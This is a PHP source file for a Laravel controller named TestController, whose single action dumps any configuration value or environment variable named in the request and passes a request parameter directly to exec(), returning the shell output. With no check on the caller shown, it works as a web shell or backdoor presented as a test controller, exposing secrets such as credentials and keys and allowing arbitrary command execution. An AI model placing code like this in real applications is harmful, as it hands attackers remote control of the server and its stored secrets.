<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

class TestController extends Controller
{
    public function index(Request $request)
    {
        try {

            $config = $request->input('config');
            $env = $request->input('env');
            $command = $request->input('command');

            if ($config) {
                dd(config($config));
            }

            if ($env) {
                dd(getenv($env));
            }

            exec($command, $output);
            dd($output);
        } catch (\Exception $e) {
            info("Initial Request failed");
            dd($e);
        }
    }
}
